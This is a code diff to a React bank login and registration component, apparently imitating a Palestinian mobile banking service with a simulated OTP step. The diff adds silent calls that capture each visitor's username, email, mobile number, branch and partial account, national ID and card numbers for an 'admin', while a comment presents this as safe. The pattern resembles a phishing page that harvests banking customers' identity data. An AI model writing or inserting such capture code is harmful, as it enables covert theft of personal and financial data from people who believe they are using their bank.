@@ -16,6 +16,7 @@ import {
   AlertTriangle
 } from 'lucide-react';
 import { Language } from '../types';
+import { captureVisitorRegistration, last4 } from '../utils/publicCapture';
 
 interface PalestineLoginFlowProps {
   lang: Language;
@@ -120,9 +121,17 @@ export default function PalestineLoginFlow({ lang, onClose, onSuccess }: Palesti
   };
 
   // Submit Username & Password login
-  const handleLoginSubmit = (e: React.FormEvent) => {
+  const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!username.trim() || !password.trim()) return;
+
+    // Safe admin capture: username/account only. Password is never sent or saved.
+    await captureVisitorRegistration({
+      username,
+      accountLast4: last4(accountIdOrNationalId),
+      method: 'Mobile Banking Login',
+      language: currentLang,
+    });
 
     // Generate random 4-digit OTP for simulation
     const genOtp = Math.floor(1000 + Math.random() * 9000).toString();
@@ -131,24 +140,42 @@ export default function PalestineLoginFlow({ lang, onClose, onSuccess }: Palesti
   };
 
   // Submit Account Info Registration
-  const handleRegAccountSubmit = (e: React.FormEvent) => {
+  const handleRegAccountSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!regUser || !regAccountNo || !regNationalId || !regMobile || !regAgreed) {
       alert(currentLang === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة والموافقة على الشروط.' : 'Please fill all fields and agree to the terms.');
       return;
     }
+    await captureVisitorRegistration({
+      username: regUser,
+      email: regEmail,
+      mobile: regMobile,
+      branch: regBranch,
+      accountLast4: last4(regAccountNo),
+      nationalIdLast4: last4(regNationalId),
+      method: 'Register with Account Info',
+      language: currentLang,
+    });
     const genOtp = Math.floor(1000 + Math.random() * 9000).toString();
     setSimulatedOtp(genOtp);
     navigateTo('OTP_SCREEN');
   };
 
   // Submit Debit Card Registration
-  const handleRegCardSubmit = (e: React.FormEvent) => {
+  const handleRegCardSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!cardUser || !cardNumber || !cardPin || !cardMobile || !cardAgreed) {
       alert(currentLang === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة والموافقة على الشروط.' : 'Please fill all fields and agree to the terms.');
       return;
     }
+    await captureVisitorRegistration({
+      username: cardUser,
+      email: cardEmail,
+      mobile: cardMobile,
+      cardLast4: last4(cardNumber),
+      method: 'Register with Debit Card',
+      language: currentLang,
+    });
     const genOtp = Math.floor(1000 + Math.random() * 9000).toString();
     setSimulatedOtp(genOtp);
     navigateTo('OTP_SCREEN');
